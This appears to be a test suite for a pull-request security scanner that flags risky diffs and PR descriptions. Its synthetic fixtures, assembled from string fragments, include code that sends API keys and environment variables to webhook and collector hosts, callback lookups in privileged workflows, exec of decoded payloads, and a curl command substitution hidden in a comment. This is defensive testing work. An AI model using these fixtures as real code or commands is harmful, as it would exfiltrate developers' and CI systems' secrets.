# Copyright 2025 Google LLC.
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

"""Tests for .github/scripts/pr_security_check.py.

Fixtures are synthetic and inert. Sensitive fragments are assembled from
pieces (see `_j`) so this file does not match the check's own rules when it
is part of a pull request.
"""

import importlib.util
import json
import pathlib
import shutil
import subprocess
import sys
import tempfile

from absl.testing import absltest
from absl.testing import parameterized

_REPO_ROOT = pathlib.Path(__file__).resolve().parent.parent
_SCRIPT_PATH = _REPO_ROOT / ".github" / "scripts" / "pr_security_check.py"


def _load_check():
  spec = importlib.util.spec_from_file_location(
      "pr_security_check", _SCRIPT_PATH
  )
  module = importlib.util.module_from_spec(spec)
  # Dataclasses resolve string annotations through sys.modules.
  sys.modules[spec.name] = module
  spec.loader.exec_module(module)
  return module


check = _load_check()


def _j(*parts: str) -> str:
  """Joins fragments so sensitive literals never appear whole in this file."""
  return "".join(parts)


_HOOK_HOST = _j("webhook", ".site")
_CALLBACK_HOST = _j("abc123.", "oastify", ".com")
_ENV = _j("os.", "environ")
_URLLIB = _j("urllib", ".request")
_POST = _j("requests.", "post(")
_PRT = _j("pull_request", "_target")


def _new_file_diff(path: str, lines: list[str], mode: str = "100644") -> str:
  body = "\n".join("+" + line for line in lines)
  return (
      f"diff --git a/{path} b/{path}\n"
      f"new file mode {mode}\n"
      "--- /dev/null\n"
      f"+++ b/{path}\n"
      f"@@ -0,0 +1,{len(lines)} @@\n"
      f"{body}\n"
  )


def _binary_diff(path: str) -> str:
  return (
      f"diff --git a/{path} b/{path}\n"
      "new file mode 100644\n"
      f"Binary files /dev/null and b/{path} differ\n"
  )


def _findings(diff: str, maintainer: bool = False):
  return check.check_files(check.parse_diff(diff), maintainer=maintainer)


def _rules(findings, severity=None):
  return {
      f.rule for f in findings if severity is None or f.severity == severity
  }


# Import-time code that sends API keys to a request-logging service.
_IMPORT_TIME_EGRESS = _new_file_diff(
    "langextract/__init__.py",
    [
        "import " + _URLLIB + " as _ur",
        "import base64 as _b64",
        'for _k in ("GEMINI_API_KEY", "OPENAI_API_KEY"):',
        "  _v = " + _ENV + ".get(_k)",
        "  if _v:",
        '    _req = _ur.Request("https://' + _HOOK_HOST + '/0000",',
        "        data=_b64.b64encode(_v.encode()))",
        "    _ur." + _j("url", "open") + "(_req, timeout=5)",
    ],
)

# A privileged workflow, a code file that git shows as binary, and a README
# with NUL bytes between its characters.
_PRIVILEGED_WORKFLOW_CHANGE = (
    _new_file_diff(
        ".github/workflows/label.yml",
        [
            "on:",
            "  " + _PRT + ":",
            "jobs:",
            "  label:",
            "    steps:",
            "      - run: " + _j("ns", "lookup") + " " + _CALLBACK_HOST,
        ],
    )
    + _binary_diff("tests/test_core.py")
    + _new_file_diff("README.md", ["\x00".join("<!-- note -->")])
)


class CheckFilesTest(parameterized.TestCase):

  def test_import_time_egress_is_high(self):
    findings = _findings(_IMPORT_TIME_EGRESS)
    self.assertEqual(
        {"credential-egress", "callback-service"},
        _rules(findings, check.HIGH),
    )
    self.assertIn("import-time-side-effect", _rules(findings, check.MEDIUM))

  def test_privileged_workflow_change_is_high_for_non_maintainer(self):
    findings = _findings(_PRIVILEGED_WORKFLOW_CHANGE)
    self.assertEqual(
        {"privileged-workflow", "callback-service", "binary-code-file"},
        _rules(findings, check.HIGH),
    )
    self.assertEqual({"hidden-characters"}, _rules(findings, check.MEDIUM))

  def test_maintainer_may_change_workflows_and_build_config(self):
    diff = _new_file_diff(
        ".github/workflows/ci.yml", ["on:", "  " + _j("workflow", "_run") + ":"]
    ) + _new_file_diff("pyproject.toml", ['version = "1.8.0"'])
    self.assertEmpty(_findings(diff, maintainer=True))

  def test_provider_reading_key_and_calling_api_is_medium(self):
    diff = _new_file_diff(
        "langextract/providers/example.py",
        [
            "import requests",
            "key = " + _ENV + '.get("EXAMPLE_API_KEY")',
            _POST + '"https://api.example.com/v1", headers={"k": key})',
        ],
    )
    findings = _findings(diff)
    self.assertEqual({"credential-with-network"}, _rules(findings))
    self.assertEqual(check.MEDIUM, findings[0].severity)

  @parameterized.named_parameters(
      dict(
          testcase_name="escaped_zero_width_in_test_source",
          path="tests/example_test.py",
          line='value = "\\u200b"',
          expected=set(),
      ),
      dict(
          testcase_name="literal_zero_width_in_code",
          path="langextract/example.py",
          line="name\u200b = 1",
          expected={"hidden-characters"},
      ),
      dict(
          testcase_name="joiner_inside_emoji_sequence",
          path="tests/tokenizer_test.py",
          line='text = "\U0001F468\u200d\U0001F469"',
          expected=set(),
      ),
      dict(
          testcase_name="literal_zero_width_in_markdown",
          path="docs/example.md",
          line="text\u200b",
          expected=set(),
      ),
      dict(
          testcase_name="bidi_control_in_markdown",
          path="docs/example.md",
          line="access \u202e level",
          expected={"hidden-characters"},
      ),
      dict(
          testcase_name="lookalike_letters_in_python",
          path="langextract/example.py",
          line="\U0001D41E\U0001D431\U0001D41E\U0001D41C = print",
          expected={"hidden-characters"},
      ),
      dict(
          testcase_name="accented_text_in_python_string",
          path="langextract/example.py",
          line='label = "café"',
          expected=set(),
      ),
  )
  def test_hidden_characters(self, path, line, expected):
    self.assertEqual(expected, _rules(_findings(_new_file_diff(path, [line]))))

  def test_bom_on_new_code_file(self):
    diff = _new_file_diff("tests/new_test.py", ["\ufeffimport os"])
    self.assertIn("byte-order-mark", _rules(_findings(diff)))

  @parameterized.named_parameters(
      dict(
          testcase_name="plain",
          line=_j("ex", "ec(") + "base64.b64decode(PAYLOAD))",
      ),
      dict(
          testcase_name="builtins_with_space",
          line=_j("builtins.ex", "ec (") + "zlib.decompress(P))",
      ),
      dict(
          testcase_name="lookalike_letters",
          line="\U0001D41E\U0001D431\U0001D41E\U0001D41C(bytes.fromhex(P))",
      ),
  )
  def test_decoded_execution_is_high(self, line):
    diff = _new_file_diff("langextract/util.py", [line])
    self.assertIn("decoded-execution", _rules(_findings(diff), check.HIGH))

  def test_regex_compile_with_base64_import_is_not_flagged(self):
    diff = _new_file_diff(
        "langextract/util.py",
        ["import base64", "PATTERN = re.compile(r'x')"],
    )
    self.assertEmpty(_findings(diff))

  def test_crlf_churn_is_low(self):
    diff = _new_file_diff("README.md", ["line\r"] * 30)
    self.assertEqual({"line-ending-churn"}, _rules(_findings(diff), check.LOW))


class FalsePositiveTest(absltest.TestCase):
  """Legitimate patterns that must stay below high."""

  def test_docs_curl_example_with_api_key_is_medium(self):
    diff = _new_file_diff(
        "docs/examples/api.md",
        [_j("cu", "rl") + ' -H "x-goog-api-key: $GEMINI_API_KEY" https://x'],
    )
    findings = _findings(diff)
    self.assertEmpty(_rules(findings, check.HIGH))
    self.assertEqual({"credential-with-network"}, _rules(findings))

  def test_basic_auth_provider_is_medium(self):
    for imports in (
        ["import base64", "import requests"],
        ["import base64, requests"],
    ):
      diff = _new_file_diff(
          "langextract/providers/basic.py",
          imports
          + [
              "key = " + _ENV + '["EXAMPLE_API_KEY"]',
              'token = base64.b64encode(f"u:{key}".encode()).decode()',
              _POST + 'url, headers={"Authorization": f"Basic {token}"})',
          ],
      )
      findings = _findings(diff)
      self.assertEmpty(_rules(findings, check.HIGH), msg=imports)
      self.assertEqual({"credential-with-network"}, _rules(findings))

  def test_mocked_client_in_test_file_is_not_high(self):
    diff = _new_file_diff(
        "tests/provider_test.py",
        [
            "from unittest import mock",
            "with mock.patch.dict(" + _ENV + ', {"FOO_API_KEY": "x"}):',
            '  with mock.patch("httpx.Client"):',
            "    run()",
        ],
    )
    self.assertEmpty(_rules(_findings(diff), check.HIGH))

  def test_local_curl_in_workflow_from_non_maintainer_is_medium(self):
    diff = _new_file_diff(
        ".github/workflows/ci.yaml",
        [
            "      - run: |",
            "          " + _j("cu", "rl") + " -fs http://localhost:11434/api",
            "        env:",
            "          GEMINI_API_KEY: " + _j("${{ sec", "rets.X }}"),
        ],
    )
    self.assertEqual({"infrastructure-change"}, _rules(_findings(diff)))

  def test_private_ip_is_ignored(self):
    diff = _new_file_diff(
        "langextract/net.py", ['URL = "http://192' + '.168.1.4:11434"']
    )
    self.assertEmpty(_findings(diff))

  def test_version_bump_from_contributor_is_medium(self):
    diff = _new_file_diff("pyproject.toml", ['version = "1.8.0"'])
    self.assertEqual({"build-config-change"}, _rules(_findings(diff)))


class CoverageRegressionTest(parameterized.TestCase):
  """Variants that an earlier version of the check missed."""

  def test_environment_dump_to_network_in_conftest_is_high(self):
    # No callback host, so copying the environment alone raises severity.
    diff = _new_file_diff(
        "tests/conftest.py",
        [
            "import requests",
            "env_vars = dict(" + _ENV + ")",
            _POST + '"https://collector.example.net", json=env_vars)',
        ],
    )
    self.assertIn("credential-egress", _rules(_findings(diff), check.HIGH))

  def test_bare_environ_import_and_aliased_requests_is_high(self):
    diff = _new_file_diff(
        "tests/util_test.py",
        [
            "from os import environ",
            "import requests as r",
            "payload = dict(" + _j("envi", "ron") + ")",
            'r.post("https://collector.example.net", json=payload)',
        ],
    )
    self.assertIn("credential-egress", _rules(_findings(diff), check.HIGH))

  def test_split_across_files_is_high(self):
    diff = _new_file_diff(
        "langextract/_collect.py", ["DATA = dict(" + _ENV + ")"]
    ) + _new_file_diff(
        "tests/conftest.py",
        ["import requests", _POST + '"https://collector.example.net", json=1)'],
    )
    self.assertIn("credential-egress", _rules(_findings(diff), check.HIGH))

  def test_split_across_files_with_only_an_import_is_not_high(self):
    diff = _new_file_diff(
        "tests/plugin_test.py", ["env = dict(" + _ENV + ")"]
    ) + _new_file_diff("tests/provider_test.py", ["import requests"])
    self.assertEmpty(_rules(_findings(diff), check.HIGH))

  @parameterized.named_parameters(
      ("function_call", _j("requests.", "post(url)"), True),
      ("async_client", _j("httpx.", "AsyncClient()"), True),
      ("client_session", _j("aiohttp.", "ClientSession()"), True),
      ("pool_manager", _j("urllib3.", "PoolManager()"), True),
      ("exception_constructor", _j("httpx.", 'ConnectError("refused")'), False),
      ("nested_exception", _j("requests.", "exceptions.HTTPError()"), False),
  )
  def test_network_calls_versus_exception_constructors(self, line, counts):
    diff = _new_file_diff(
        "tests/net_test.py", ["payload = dict(" + _ENV + ")", line]
    )
    findings = _findings(diff)
    self.assertEqual(
        counts, "credential-egress" in _rules(findings, check.HIGH)
    )

  def test_comma_import_of_network_library_is_detected(self):
    diff = _new_file_diff(
        "langextract/__init__.py",
        [
            "import os, requests as r",
            "key = " + _ENV + '["GEMINI_API_KEY"]',
            'r.post("https://collector.example.net", data=key)',
        ],
    )
    self.assertIn("credential-egress", _rules(_findings(diff), check.HIGH))

  def test_path_containing_diff_marker_is_parsed_and_flagged(self):
    diff = _binary_diff("x b/tests/y.py")
    (file,) = check.parse_diff(diff)
    self.assertEqual("x b/tests/y.py", file.path)
    findings = _findings(diff)
    self.assertIn("binary-code-file", _rules(findings, check.HIGH))
    self.assertIn("unusual-path", _rules(findings, check.MEDIUM))

  def test_check_source_does_not_count_as_environment_copy(self):
    lines = _SCRIPT_PATH.read_text(encoding="utf-8").split("\n")
    diff = _new_file_diff("langextract/_copy.py", lines) + _new_file_diff(
        "tests/net_test.py", [_POST + '"https://x.example", json=1)']
    )
    self.assertEmpty(_rules(_findings(diff), check.HIGH))

  def test_quoted_workflow_path_is_still_checked(self):
    diff = (
        'diff --git "a/.github/workflows/a\\"b.yml"'
        ' "b/.github/workflows/a\\"b.yml"\nnew file mode 100644\n---'
        ' /dev/null\n+++ "b/.github/workflows/a\\"b.yml"\n@@ -0,0 +1,2'
        " @@\n+on:\n+  "
        + _PRT
        + ":\n"
    )
    (file,) = check.parse_diff(diff)
    self.assertEqual('.github/workflows/a"b.yml', file.path)
    findings = _findings(diff)
    self.assertIn("privileged-workflow", _rules(findings, check.HIGH))
    self.assertIn("unusual-path", _rules(findings, check.MEDIUM))

  @parameterized.named_parameters(
      dict(
          testcase_name="binary_with_quoted_path",
          diff=(
              'diff --git "a/.github/workflows/x\\ty.yml"'
              ' "b/.github/workflows/x\\ty.yml"\n'
              "new file mode 100644\n"
              "Binary files /dev/null and"
              ' "b/.github/workflows/x\\ty.yml" differ\n'
          ),
          path=".github/workflows/x\ty.yml",
          quoted=True,
      ),
      dict(
          testcase_name="pure_rename",
          diff=(
              "diff --git a/docs/notes.yml b/.github/workflows/notes.yml\n"
              "similarity index 100%\n"
              "rename from docs/notes.yml\n"
              "rename to .github/workflows/notes.yml\n"
          ),
          path=".github/workflows/notes.yml",
          quoted=False,
      ),
      dict(
          testcase_name="deletion",
          diff=(
              "diff --git a/.github/workflows/ci.yaml"
              " b/.github/workflows/ci.yaml\n"
              "deleted file mode 100644\n"
              "--- a/.github/workflows/ci.yaml\n"
              "+++ /dev/null\n"
              "@@ -1,2 +0,0 @@\n"
              "-on:\n"
              "-  push:\n"
          ),
          path=".github/workflows/ci.yaml",
          quoted=False,
      ),
      dict(
          testcase_name="path_with_spaces",
          diff=(
              "diff --git a/docs/my notes.md b/docs/my notes.md\n"
              "new file mode 100644\n"
              "Binary files /dev/null and b/docs/my notes.md differ\n"
          ),
          path="docs/my notes.md",
          quoted=False,
      ),
  )
  def test_paths_are_parsed_from_every_header_form(self, diff, path, quoted):
    (file,) = check.parse_diff(diff)
    self.assertEqual(path, file.path)
    self.assertEqual(quoted, file.quoted_path)
    self.assertEmpty(file.added)

  def test_workflow_renamed_or_deleted_by_contributor_is_flagged(self):
    rename = (
        "diff --git a/docs/notes.yml b/.github/workflows/notes.yml\n"
        "similarity index 100%\n"
        "rename from docs/notes.yml\n"
        "rename to .github/workflows/notes.yml\n"
    )
    deletion = (
        "diff --git a/.github/workflows/ci.yaml b/.github/workflows/ci.yaml\n"
        "deleted file mode 100644\n"
        "--- a/.github/workflows/ci.yaml\n"
        "+++ /dev/null\n"
        "@@ -1 +0,0 @@\n"
        "-on: push\n"
    )
    for diff in (rename, deletion):
      self.assertEqual({"infrastructure-change"}, _rules(_findings(diff)))

  def test_added_lines_starting_with_plus_signs_are_kept(self):
    diff = (
        "diff --git a/a.py b/a.py\n"
        "--- a/a.py\n"
        "+++ b/a.py\n"
        "@@ -0,0 +1,2 @@\n"
        "+x = 1\n"
        "+++ y\n"
    )
    (file,) = check.parse_diff(diff)
    self.assertEqual([(1, "x = 1"), (2, "++ y")], file.added)

  def test_binary_code_file_is_high_and_loadable_binary_is_medium(self):
    findings = _findings(
        _binary_diff("langextract/_x.py") + _binary_diff("langextract/_y.pyc")
    )
    self.assertEqual({"binary-code-file"}, _rules(findings, check.HIGH))
    self.assertEqual({"binary-file"}, _rules(findings, check.MEDIUM))

  def test_symlink_is_medium(self):
    diff = _new_file_diff("tests/data.txt", ["/proc/self/environ"], "120000")
    self.assertIn("symlink", _rules(_findings(diff), check.MEDIUM))

  def test_remote_dependency_from_contributor_is_high(self):
    diff = _new_file_diff(
        "pyproject.toml",
        ['dependencies = ["helper @ ' + _j("git+", "https") + '://x/y.git"]'],
    )
    self.assertIn("remote-dependency", _rules(_findings(diff), check.HIGH))

  def test_gitattributes_change_is_medium(self):
    diff = _new_file_diff(".gitattributes", ["*.py linguist-generated"])
    self.assertIn("repository-config-change", _rules(_findings(diff)))


class CheckMetadataTest(parameterized.TestCase):

  def test_command_substitution_in_description_is_high(self):
    body = "Fixes typo. " + _j("$(", "curl") + " -d $(whoami) https://x)"
    findings = check.check_metadata("docs: minor update", body, "fix/typo")
    self.assertIn("command-substitution", _rules(findings, check.HIGH))

  def test_absolute_tool_path_is_still_high(self):
    body = _j("$(", "/usr/bin/curl") + " https://x)"
    findings = check.check_metadata("x", body, "y")
    self.assertIn("command-substitution", _rules(findings, check.HIGH))

  def test_hidden_comment_payload_with_raw_ip(self):
    # Command substitution hidden inside an HTML comment.
    body = _j(
        "Updated guidelines.\n<!--\n$(",
        "curl -s http://203",
        ".0.113.7:8443/c/x -d $(",
        "env|base64))\n-->",
    )
    findings = check.check_metadata("docs: update guide", body, "docs/update")
    self.assertIn("command-substitution", _rules(findings, check.HIGH))
    self.assertEqual(
        {"raw-ip-url", "hidden-comment-command"},
        _rules(findings, check.MEDIUM),
    )

  def test_backtick_command_in_hidden_comment_is_medium(self):
    body = "Docs.\n<!-- `" + _j("cu", "rl") + " https://x` -->"
    findings = check.check_metadata("x", body, "y")
    self.assertEqual({"hidden-comment-command"}, _rules(findings))

  @parameterized.named_parameters(
      dict(
          testcase_name="docker_healthcheck",
          body=(
              "The healthcheck uses 'curl', which is not in the image:\n"
              "```\ndocker inspect --format='{{json .State.Health}}' x\n```"
          ),
      ),
      dict(
          testcase_name="install_script",
          body="Install with `curl -fsSL https://example.com/install.sh | sh`",
      ),
      dict(
          testcase_name="git_substitution",
          body="Tested with:\n```\npytest -q tests/$(git rev-parse HEAD)\n```",
      ),
      dict(
          testcase_name="template_comment",
          body="<!-- Please describe your change below. -->\nAdds a test.",
      ),
  )
  def test_ordinary_descriptions_are_not_high_or_medium(self, body):
    findings = check.check_metadata("Fix healthcheck", body, "fix/healthcheck")
    self.assertEmpty(_rules(findings, check.HIGH))
    self.assertEmpty(_rules(findings, check.MEDIUM))


class ReportTest(absltest.TestCase):

  def test_excerpt_is_inert_and_visible(self):
    excerpt = check.safe_excerpt("post https://" + _HOOK_HOST + "/x\x00`<b>")
    self.assertNotIn("://", excerpt)
    self.assertNotIn(_HOOK_HOST, excerpt)
    self.assertIn("\\u0000", excerpt)
    self.assertNotIn("`", excerpt)
    self.assertNotIn("<", excerpt)

  def test_detailed_summary_renders_crafted_path_inert(self):
    path = "a`[click](https://example.invalid)`<!--.py"
    finding = check.Finding(check.HIGH, "callback-service", "m", path, 3)
    summary = check.render_summary([finding])
    self.assertIn("`a'[click](https://example.invalid)'&lt;!--.py:3`", summary)
    self.assertNotIn("<!--", summary)

  def test_brief_summary_has_counts_and_repro_only(self):
    finding = check.Finding(check.HIGH, "callback-service", "secret detail")
    summary = check.render_summary(
        [finding], brief=True, repro="python check.py --base b --head h"
    )
    self.assertIn("Review required: 1 high, 0 medium, 0 low.", summary)
    self.assertIn("python check.py --base b --head h", summary)
    self.assertNotIn("callback-service", summary)
    self.assertNotIn("secret detail", summary)

  def test_check_and_tests_do_not_flag_themselves(self):
    diff = ""
    for path in (_SCRIPT_PATH, pathlib.Path(__file__)):
      lines = path.read_text(encoding="utf-8").split("\n")
      diff += _new_file_diff(path.relative_to(_REPO_ROOT).as_posix(), lines)
    findings = _findings(diff, maintainer=True)
    self.assertEmpty(findings, msg=str(findings))


class MainTest(absltest.TestCase):

  def setUp(self):
    super().setUp()
    if shutil.which("git") is None:
      self.skipTest("git is not available")
    self.repo = tempfile.mkdtemp()
    self.addCleanup(shutil.rmtree, self.repo, ignore_errors=True)

  def _git(self, *args: str) -> str:
    result = subprocess.run(
        ["git", "-C", self.repo, *args],
        check=True,
        capture_output=True,
        text=True,
    )
    return result.stdout.strip()

  def _commit(self, path: str, content: str) -> str:
    target = pathlib.Path(self.repo, path)
    target.parent.mkdir(parents=True, exist_ok=True)
    target.write_text(content, encoding="utf-8")
    self._git("add", path)
    self._git(
        "-c",
        "user.name=t",
        "-c",
        "user.email=t@example.com",
        "commit",
        "-q",
        "-m",
        path,
    )
    return self._git("rev-parse", "HEAD")

  def test_main_writes_reports_and_fails_on_high(self):
    self._git("init", "-q")
    base = self._commit("README.md", "hello\n")
    added = [
        line[1:]
        for line in _IMPORT_TIME_EGRESS.split("\n")
        if line.startswith("+") and not line.startswith("+++")
    ]
    head = self._commit("langextract/__init__.py", "\n".join(added) + "\n")
    json_out = pathlib.Path(self.repo, "out.json")
    summary_out = pathlib.Path(self.repo, "summary.md")
    argv = [
        "--repo-dir",
        self.repo,
        "--base",
        base,
        "--head",
        head,
        "--json-out",
        str(json_out),
        "--summary-out",
        str(summary_out),
        "--brief",
    ]

    self.assertEqual(0, check.main(argv))
    self.assertEqual(
        check.EXIT_HIGH_FINDINGS, check.main(argv + ["--fail-on-high"])
    )

    report = json.loads(json_out.read_text(encoding="utf-8"))
    self.assertGreaterEqual(report["high"], 2)
    summary = summary_out.read_text(encoding="utf-8")
    self.assertIn("Review required", summary)
    self.assertNotIn(_HOOK_HOST, summary)
    self.assertNotIn("credential-egress", summary)


if __name__ == "__main__":
  absltest.main()
